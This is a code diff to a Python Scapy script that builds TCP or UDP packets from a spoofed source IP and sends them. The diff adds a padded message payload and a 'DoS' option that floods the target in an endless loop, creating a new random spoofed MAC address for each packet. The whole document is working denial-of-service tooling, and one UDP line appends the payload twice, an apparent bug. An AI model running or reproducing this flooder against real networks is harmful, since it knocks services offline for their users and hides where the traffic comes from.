@@ -39,6 +39,14 @@ if prot == "TCP":
     flag=str(input())
     flag=flag.upper()
 
+print ("Enter message for sending..:")
+msg=str(input())
+length=len(msg)
+length2=int(1460/length)
+
+data=Raw(load=msg*length2)
+print(len(data))
+
 print ("DoS? - [YES] or [NO] :-)  : ")
 dos=str(input())
 dos=dos.upper()
@@ -50,17 +58,17 @@ iphdr=IP(src=srcip,dst=dstip)
 if prot == "TCP":
     tcp=TCP(sport=9999,dport=port,flags=flag)
     if macspoof == "YES":
-        packet=etherframe/iphdr/tcp
+        packet=etherframe/iphdr/tcp/data
     else:
-        packet=iphdr/tcp
+        packet=iphdr/tcp/data
 
 # Build UDP packet
 if prot == "UDP":
     udp=UDP(sport=9999,dport=port)
     if macspoof == "YES":
-        packet=etherframe/iphdr/udp
+        packet=etherframe/iphdr/udp/data
     else:
-        packet=iphdr/udp
+        packet=iphdr/udp/data/data
 
 # Send the packet
 
@@ -73,6 +81,15 @@ else:
 if dos =="YES":
     while True:
         if macspoof == "YES":
-            sendp(packet, iface="en0")
+            if prot == "TCP":
+                mac=macspoofer()
+                etherframe=Ether(src=mac)
+                packet=etherframe/iphdr/tcp/data
+                sendp(packet, iface="en0")
+            else:
+                mac=macspoofer()
+                etherframe=Ether(src=mac)
+                packet=etherframe/iphdr/udp/data
+                sendp(packet, iface="en0")
         else:
             send(packet)
